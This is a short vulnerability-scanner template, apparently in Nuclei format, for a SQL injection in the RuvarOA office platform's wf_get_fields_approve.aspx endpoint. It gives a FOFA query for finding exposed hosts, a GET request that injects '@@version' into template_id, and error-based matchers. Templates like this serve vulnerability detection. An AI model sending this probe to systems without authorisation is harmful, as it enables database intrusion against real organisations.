id: ruvaroa-wf_get_fields_approve-sqli

info:
  name: "RuvarOA协同办公平台 wf_get_fields_approve 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="txt_admin_key"
      RuvarOA协同办公平台 的 wf_get_fields_approve 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现对数据库的未授权操作，包括数据篡改、删除或注入恶意记录，从而导致数据完整性受损及服务中断。
  tags: RuvarOA协同办公平台

http:
- raw:
  - |
    GET /WorkFlow/wf_get_fields_approve.aspx?template_id=@@version HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'nvarchar'
